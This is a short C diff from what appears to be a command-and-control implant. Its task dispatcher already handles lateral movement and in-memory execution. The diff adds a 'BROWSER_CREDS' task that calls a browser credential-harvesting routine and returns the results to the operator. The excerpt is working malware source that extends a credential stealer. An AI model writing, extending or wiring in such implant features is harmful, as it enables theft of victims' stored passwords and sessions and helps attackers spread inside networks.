@@ -15,6 +15,7 @@
 #include "api_resolve.h"
 #include "pe_exec.h"
 #include "dotnet.h"
+#include "browsercreds.h"
 #include <bcrypt.h>
 #include <winternl.h>
 
@@ -2079,6 +2080,11 @@ void dispatch_task(AgentTask *task) {
             char e2[128]; snprintf(e2,sizeof(e2),"unknown lateral method: %s",lat_method);
             agent_send_result(task->id,"",e2);
         }
+    }
+    else if (strcmp(type_upper, "BROWSER_CREDS") == 0) {
+        char *out = do_browser_creds();
+        agent_send_result(task->id, out ? out : "no credentials found", "");
+        free(out);
     }
     else {
         char err[128];
